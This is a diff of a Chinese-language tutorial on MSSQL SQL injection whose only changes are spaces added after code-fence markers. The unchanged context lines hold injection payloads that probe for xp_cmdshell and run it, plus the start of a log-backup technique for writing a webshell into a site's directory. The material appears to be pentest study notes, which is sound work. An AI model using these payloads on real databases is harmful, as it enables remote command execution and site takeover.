@@ -22,7 +22,7 @@
 
 调用数据库的代码，一般写在配置文件里面config, conn；
 
-```vbscript
+``` vbscript
 <%
     set conn = server.createobject("adodb.connecton")
     conn.open "provider=sqloledb;source=local;uid=sa;pwd=***;database=database-name"
@@ -132,7 +132,7 @@ exec master.dbo.xp_cmdshell username;--
 
 - 利用mssql扩展存储注入攻击
 
-  ```mssql
+  ``` mssql
   1. 检测与恢复扩展存储
   /*判断xp_cmdhshell扩展存储是否存在*/
   and 1=(select name from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell')
@@ -182,7 +182,7 @@ exec master.dbo.xp_cmdshell username;--
 
   找到web目录后，即可写入一句话木马(dbo权限)
 
-  ```mssql
+  ``` mssql
   ;alter database news set RECOVERY FULL 
   ;create table test(str image)-- 
   ;backup log news to disk='c:\test' with init-- 
